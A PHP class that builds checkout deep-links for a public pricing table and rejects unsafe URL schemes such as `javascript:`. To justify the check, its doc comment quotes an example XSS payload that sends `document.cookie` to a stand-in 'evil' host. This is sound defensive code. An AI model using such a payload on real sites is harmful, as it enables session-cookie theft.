<?php

declare(strict_types=1);

namespace App\Billing\Storefront;

use App\Billing\Storefront\Contracts\BuildsCheckoutLinks;

/**
 * Builds a pricing-table CTA's deep-link — the hand-off from a PUBLIC, pre-customer pricing
 * page into the operator's checkout entry point, carrying the chosen `{plan}` / `{currency}` /
 * `{interval}` / `{price}` (ADR-0009 Path A boundary).
 *
 * Why a hand-off and not a hosted-checkout URL directly: the hosted checkout is addressed by an
 * opaque, ORG-scoped session token ({@see App\Billing\Hosted\BillingSessionService}) — but a
 * marketing-page visitor has no organization yet, so the table cannot mint a session. Instead it
 * links to the operator's own checkout/signup entry (their authenticated app), which receives the
 * plan+currency+interval and calls `POST /api/v1/checkout-sessions` to mint the real hosted
 * checkout URL. The paywall (which DOES have an org in hand) links straight to the hosted checkout
 * via the {@see App\Billing\Enforcement\Upgrade\UpgradeGate} instead.
 *
 * Target resolution, deny-by-default at each step:
 *  1. The table's own `cta_url_template` when set.
 *  2. Else the configured storefront checkout URL (`billing.storefront.checkout_url`).
 *  3. Else the app root — so the CTA is always a valid link, never a dead `#`.
 *
 * A target containing any `{...}` placeholder has them substituted (URL-encoded); a target with
 * none gets the params appended as a query string (merged with any it already carries).
 *
 * SCHEME SAFETY. The built URL is rendered into an `href` on the PUBLIC, unauthenticated pricing
 * table and its embed — and handed to the client renderer as JSON. Blade escapes HTML entities,
 * but a scheme carries none: `javascript:fetch('//evil/'+document.cookie)` survives escaping
 * intact and executes on the billing origin, which also serves the operator console and the
 * hosted checkout. The write path validates the scheme, and {@see safeTarget()} re-checks here so
 * a template that reached the database by any other route (an import, a seeder, a direct write)
 * still cannot emit a dangerous href. An unsafe target falls back to the configured default
 * rather than rendering — deny-by-default, same as every other step above.
 */
readonly class CheckoutLinkBuilder implements BuildsCheckoutLinks
{
    /**
     * The only schemes a CTA may address. Anything else — `javascript:`, `data:`, `vbscript:` —
     * is refused. A relative target (no scheme) is allowed: it stays on this origin.
     */
    private const ALLOWED_SCHEMES = ['http', 'https'];

    public function __construct(private string $defaultCheckoutUrl) {}

    /**
     * Whether a CTA target is safe to render into an `href`. Relative targets pass; absolute ones
     * must carry an allow-listed scheme. Shared with the write-path validator so the console
     * refuses at save time with the same rule this enforces at render time.
     */
    public static function isSafeTarget(string $target): bool
    {
        $trimmed = trim($target);

        if ($trimmed === '') {
            return false;
        }

        // A scheme-relative URL (`//host/path`) inherits the page's scheme and is safe.
        if (str_starts_with($trimmed, '//')) {
            return true;
        }

        $scheme = parse_url($trimmed, PHP_URL_SCHEME);

        if ($scheme === false) {
            return false;
        }

        // No scheme parsed — a path-relative target such as `/signup?plan={plan}`. Only a colon
        // BEFORE the first `/`, `?` or `#` could be a scheme; one inside a query or fragment is
        // ordinary data. Checking the whole first slash-segment would reject the legitimate and
        // common `signup?return=https://merchant.example/done`, silently dropping such a table
        // back to the default checkout URL and breaking the operator's deep link.
        if ($scheme === null) {
            $delimiter = strcspn($trimmed, '/?#');

            return ! str_contains(substr($trimmed, 0, $delimiter), ':');
        }

        return in_array(strtolower($scheme), self::ALLOWED_SCHEMES, true);
    }

    /**
     * @param  array<string, string>  $attribution  Extra params (e.g. an A/B experiment's
     *                                              attribution triple) appended as a query
     *                                              string to EITHER form of target, so a
     *                                              placeholder template still carries them.
     */
    public function build(?string $template, string $planKey, string $currency, string $interval, int $priceMinor, array $attribution = []): string
    {
        $target = $this->firstNonEmpty($template, $this->defaultCheckoutUrl);

        $replacements = [
            '{plan}' => $planKey,
            '{currency}' => $currency,
            '{interval}' => $interval,
            '{price}' => (string) $priceMinor,
        ];

        if ($this->hasPlaceholder($target)) {
            $url = strtr($target, array_map(rawurlencode(...), $replacements));

            // A placeholder template addresses the plan/currency itself; attribution is not part
            // of the template contract, so it rides along as an appended query string.
            return $attribution === [] ? $url : $this->appendQuery($url, $attribution);
        }

        return $this->appendQuery($target, [
            'plan' => $planKey,
            'currency' => $currency,
            'interval' => $interval,
            'price' => (string) $priceMinor,
            ...$attribution,
        ]);
    }

    private function hasPlaceholder(string $target): bool
    {
        return str_contains($target, '{plan}')
            || str_contains($target, '{currency}')
            || str_contains($target, '{interval}')
            || str_contains($target, '{price}');
    }

    /**
     * @param  array<string, string>  $params
     */
    private function appendQuery(string $target, array $params): string
    {
        $separator = str_contains($target, '?') ? '&' : '?';

        return $target.$separator.http_build_query($params);
    }

    /**
     * The preferred target when it is both present AND scheme-safe, else the fallback. An unsafe
     * template is dropped rather than sanitised: there is no meaningful "cleaned" form of
     * `javascript:…`, and silently rendering a neutered version would hide the misconfiguration
     * from the operator.
     */
    private function firstNonEmpty(?string $preferred, string $fallback): string
    {
        if ($preferred !== null && trim($preferred) !== '' && self::isSafeTarget($preferred)) {
            return $preferred;
        }

        // The CONFIGURED fallback is checked too. It comes from
        // `CBOX_BILLING_STOREFRONT_CHECKOUT_URL` via the service provider, so validating only the
        // per-table template left the whole allow-list bypassable by one env var — and that value
        // lands in the same public `href` on every pricing table at once, which is strictly worse
        // than the per-table case this class was hardened against.
        if (self::isSafeTarget($fallback)) {
            return $fallback;
        }

        // Neither is usable. Address the app root rather than emitting an unsafe link or a dead
        // `#`: the CTA stays clickable and lands somewhere real.
        return '/';
    }
}
